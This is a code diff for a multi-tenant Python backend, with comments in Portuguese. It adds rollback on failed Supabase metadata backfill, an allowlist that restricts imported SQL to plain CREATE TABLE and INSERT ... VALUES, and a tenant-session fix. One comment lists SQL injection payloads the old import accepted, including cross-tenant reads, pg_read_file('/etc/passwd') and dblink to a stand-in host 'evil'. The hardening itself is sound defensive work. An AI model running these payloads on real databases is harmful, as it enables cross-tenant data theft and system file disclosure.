@@ -240,8 +240,41 @@ def create_admin(user_data: schemas.UserCreate, db: Session = Depends(get_db), m
         raise
 
     # M4: backfill do app_metadata.tenant_id (precisa do id local recém criado).
+    #
+    # B11: este PATCH roda DEPOIS do commit, e antes ficava fora de qualquer
+    # compensação. Quando ele falhava, o master levava 500 mas o admin já
+    # existia em `public.users` E em `auth.users` — sem `tenant_id` no
+    # `app_metadata`, e sem ninguém desfazer. Hoje isso é invisível porque
+    # nenhum código do backend lê esse claim (o tenant sai do banco local);
+    # vira falha silenciosa no dia em que algo o ler — o M10 leria.
+    #
+    # Compensar do mesmo jeito do bloco acima (apagar o user do Supabase e a
+    # linha local) é o que mantém a promessa: ou o admin nasce inteiro, ou não
+    # nasce.
+    #
+    # O `ensure_tenant_schema` (logo abaixo) fica DE FORA da compensação, e de
+    # propósito: ele roda depois deste bloco, então quando a compensação
+    # dispara o schema ainda não existe. Se ele próprio falhar, o admin fica
+    # sem schema — e isso se autocura na primeira tabela criada, porque o
+    # `create_physical_table` chama `ensure_tenant_schema` de novo. É gap
+    # conhecido e barato, não esquecimento.
     if sup_uid:
-        supabase_admin.update_user_metadata(sup_uid, role="admin", tenant_id=new_admin.id)
+        try:
+            supabase_admin.update_user_metadata(sup_uid, role="admin", tenant_id=new_admin.id)
+        except Exception as exc:
+            logger.exception("backfill de app_metadata falhou para admin %s — desfazendo",
+                             new_admin.id)
+            try:
+                db.delete(new_admin)
+                db.commit()
+            except Exception:
+                db.rollback()
+                logger.exception("rollback local do admin %s TAMBEM falhou", new_admin.id)
+            supabase_admin.delete_user(sup_uid)
+            raise HTTPException(
+                status_code=502,
+                detail=f"Falha ao provisionar metadados do admin no Supabase: {exc}",
+            )
 
     # M3 Fase 3: provisiona o schema tenant_N em Postgres (no-op em SQLite).
     from dynamic_schema import ensure_tenant_schema
@@ -2096,6 +2129,70 @@ from sqlglot import exp
 
 from sqlalchemy import inspect as _inspect
 
+# ── B13: a forma permitida do statement importado ────────────────────────
+#
+# O parser antigo classificava só o NÓ DE TOPO (`isinstance(stmt, exp.Create)`
+# / `exp.Insert`) e reescrevia só a PRIMEIRA `exp.Table` da árvore. Tudo que
+# estivesse dentro passava intacto. Medido no parser real, TUDO abaixo era
+# aceito por um admin comum enviando um `.sql`:
+#
+#   INSERT INTO minha SELECT * FROM t5_alheia        -> leitura cross-tenant
+#   CREATE TABLE roubo AS SELECT * FROM tenant_5.x   -> cópia de outro workspace
+#   CREATE TABLE dump AS SELECT * FROM users         -> hashes de senha
+#   INSERT INTO tenant_2.alvo (c) VALUES (1)         -> ESCRITA em outro tenant
+#   INSERT INTO t (c) SELECT set_config('app.is_master','true',false)
+#   INSERT INTO t (c) SELECT pg_read_file('/etc/passwd')
+#   INSERT INTO t (c) SELECT dblink('host=evil','...')
+#   CREATE TABLE x (c text DEFAULT set_config(...))  -> função no DEFAULT
+#   INSERT INTO t (c) VALUES (1) RETURNING set_config(...)
+#
+# A trava NÃO é lista de funções proibidas: essa lista envelhece a cada versão
+# do Postgres, e o atacante só precisa de uma que ninguém lembrou. É o inverso —
+# uma ALLOWLIST DE FORMA. O caso de uso é dump de ferramenta: `CREATE TABLE` com
+# colunas e `INSERT ... VALUES` com literais. Qualquer coisa fora disso é
+# recusada, mesmo que pareça inofensiva.
+#
+# Custo aceito e declarado: `INSERT ... SELECT` deixa de funcionar. Nenhum dump
+# de ferramenta gera isso, e era exatamente essa a forma que exfiltrava.
+_EXPR_PROIBIDA = (
+    exp.Select,      # subquery/CTAS em qualquer posição
+    exp.Subquery,
+    exp.With,        # CTE escondendo a origem
+    exp.Union,
+    exp.Func,        # qualquer chamada de função…
+    exp.Anonymous,   # …inclusive as que o sqlglot não conhece pelo nome
+)
+
+
+def _rejeita_forma(stmt, tipo: str) -> str | None:
+    """Devolve o motivo da recusa, ou None se a forma é permitida."""
+    # 1. Nome qualificado por schema/catálogo escapa do prefixo do tenant.
+    #    `INSERT INTO tenant_2.alvo` gravava no schema de OUTRO admin — provado.
+    for tabela in stmt.find_all(exp.Table):
+        if tabela.args.get("db") or tabela.args.get("catalog"):
+            return ("nome qualificado por schema não é aceito no import "
+                    f"('{tabela.sql(dialect='sqlite')}') — use só o nome da tabela")
+
+    # 2. Uma tabela só: a do alvo. Toda origem extra (FROM/JOIN/CTE) é leitura
+    #    que o import não tem por que fazer, e era o vetor de exfiltração.
+    tabelas = list(stmt.find_all(exp.Table))
+    if len(tabelas) != 1:
+        return (f"o statement referencia {len(tabelas)} tabelas; o import aceita "
+                "só a tabela de destino (sem SELECT de outra tabela)")
+
+    # 3. Nenhuma expressão executável em lugar nenhum da árvore.
+    for no in stmt.walk():
+        if isinstance(no, _EXPR_PROIBIDA):
+            nome = getattr(no, "name", None) or no.__class__.__name__
+            return (f"expressão não permitida no import ({nome}) — só CREATE TABLE "
+                    "com colunas e INSERT ... VALUES com literais")
+
+    # 4. RETURNING executa expressão depois do INSERT.
+    if stmt.args.get("returning"):
+        return "RETURNING não é aceito no import"
+    return None
+
+
 def _parse_sql_statements(sql_text: str, prefix: str):
     """Parse SQL text into a list of safe statement info dicts for execution."""
     results = []
@@ -2119,6 +2216,14 @@ def _parse_sql_statements(sql_text: str, prefix: str):
                     results.append({"type": stmt_type, "status": "blocked", "message": "No table name found."})
                     continue
 
+                # B13: a forma tem que ser checada ANTES da reescrita — um CTAS
+                # (`CREATE TABLE x AS SELECT * FROM alheia`) tem `kind == TABLE`
+                # e passava por aqui.
+                motivo = _rejeita_forma(stmt, stmt_type)
+                if motivo:
+                    results.append({"type": stmt_type, "status": "blocked", "message": motivo})
+                    continue
+
                 table_name = table_node.name
                 physical_name = f"{prefix}{table_name}"
                 # Safely mutate AST
@@ -2132,6 +2237,11 @@ def _parse_sql_statements(sql_text: str, prefix: str):
                 table_node = stmt.find(exp.Table)
                 if not table_node or not table_node.name:
                     results.append({"type": stmt_type, "status": "blocked", "message": "No table name found in INSERT."})
+                    continue
+
+                motivo = _rejeita_forma(stmt, stmt_type)
+                if motivo:
+                    results.append({"type": stmt_type, "status": "blocked", "message": motivo})
                     continue
 
                 table_name = table_node.name
@@ -2629,8 +2739,27 @@ def _build_snapshot_payload(
     """Coleta os dados das tabelas curadas e monta o blob do snapshot.
 
     Trunca em `MAX_ROWS_PER_TABLE` por tabela (decisão Diretor 2026-05-17).
+
+    **B10 — por que o `set_tenant_for_session` está aqui:** este é o ÚNICO
+    caminho do backend que lia tabela física de tenant sem declarar o tenant.
+    Ele roda sob `get_db` (as duas rotas que o chamam — criar versão e preview
+    — precisam de commit manual), e `get_db` não seta o GUC.
+
+    Isso funcionava por acidente de privilégio: a role da aplicação tem
+    `rolbypassrls=TRUE` hoje, então a policy nunca é avaliada. No dia em que
+    esse privilégio cair (pooler novo, hardening, role dedicada), o mesmo
+    endpoint passa a errar de **duas** formas conforme o estado da conexão:
+
+      - conexão reciclada (GUC em `''`) → 22P02 → **500**;
+      - conexão virgem (GUC NULL) → **200 com `rows: []`**, sobe o blob e
+        publica um **site vazio**, sem erro nenhum.
+
+    O segundo é o perigoso, e é a razão de o fix estar aqui e não só na policy:
+    corrigir a policy faria o 500 virar silêncio. Declarar o tenant mata os dois.
     """
     from datetime import datetime as _dt
+
+    set_tenant_for_session(db, owner.id)
 
     tables_payload: list[dict] = []
     for item in table_selection:
